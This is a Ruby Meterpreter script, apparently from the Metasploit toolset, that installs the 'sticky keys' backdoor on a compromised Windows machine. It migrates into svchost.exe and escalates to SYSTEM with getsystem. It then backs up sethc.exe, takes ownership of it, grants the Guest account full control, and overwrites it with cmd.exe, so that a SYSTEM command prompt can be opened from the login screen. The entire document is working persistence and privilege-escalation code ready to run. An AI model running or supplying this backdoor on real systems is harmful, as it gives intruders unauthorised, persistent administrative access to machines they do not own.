session = client

if client.platform !~ /win32|win64/
	print_error("This meterpreter script is not supported on this system!")
	raise Rex::Script::Completed
end

force = ""

def usage()
	print_line("Meterpreter script for setting the stickykeys backdoor")
	print_line("Usage:\tstickykeys")
	print_line("OR:\tstickykeys -f\n")
	print_line("OPTIONS:\n")
	print_line("-h	    This help menu")
	print_line("-f	    Force install regardless if the backdoor may already be installed")
	raise Rex::Script::Completed
end


@@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu" ],
	"-f"  => [ false,   "Force install" ],
)

@@exec_opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		usage()
	when "-f"
		force = "valid"
	end
end

#checking to see if the backdoor may have been already be installed

if not force == "valid"
	setbackup="%SYSTEMROOT%\\system32\\sethc.bk"

	begin
		client.fs.file.stat(setbackup)
		print_error("It appears as if the backdoor may already be installed!")
		status = "discovered"
	rescue
		print_status("sethc.bk was not found..")
	end
end

if status == "discovered"
	print_status("If you want to install the backdoor still, please use -f")
	raise Rex::Script::Completed
elsif force == "valid"
	print_status("force option selected!")
end

		
begin 
	print_status("I need to migrate to a process that has SYSTEM level privileges")
	print_status("Wait a sec..")
	session.console.run_single("run migrate svchost.exe")
	print_status("Attempting to get SYSTEM")
	session.console.run_single("getsystem")
rescue
	print_error("[!] There seemed to have been a problem...")
	print_error("[!] Exiting!")
	raise Rex::Script::Completed
end

sethcloc="%SYSTEMROOT%\\system32\\sethc.exe"

begin 
	client.fs.file.stat(sethcloc)
	print_status("sethc.exe file has been found..")
	print_status("Creating backup file (sethc.bk)..")
	session.sys.process.execute("cmd.exe /C copy %SYSTEMROOT%\\system32\\sethc.exe %SYSTEMROOT%\\system32\\sethc.bk /Y", nil, {'Hidden' => true})
	winver = session.sys.config.sysinfo
	if winver["OS"] =~ (/Windows 7|Vista|Windows 2003|Windows 2008/)
		print_status("Changing ownership of the file with takeown (Windows 7 | Vista | Windows 2k3 | Windows 2K8)")
		session.sys.process.execute("cmd.exe /C takeown /f %SYSTEMROOT%\\system32\\sethc.exe", nil, {'Hidden' => true})
	end
	print_status("Changing permissions on sethc.exe..")
	session.sys.process.execute("cmd.exe /C cacls %SYSTEMROOT%\\system32\\sethc.exe /e /p Guest:F", nil, {'Hidden' => true})
	print_status("Replacing original sethc.exe with cmd.exe")
	session.sys.process.execute("cmd.exe /C copy %SYSTEMROOT%\\system32\\cmd.exe %SYSTEMROOT%\\system32\\sethc.exe /Y", nil, {'Hidden' => true})
rescue
	print_error("[!] There may have been a problem finding the sethc.exe file")
	print_error("[!] There seemed to have been a problem..")
	raise Rex::Script::Completed
end

print_status("Finished..")
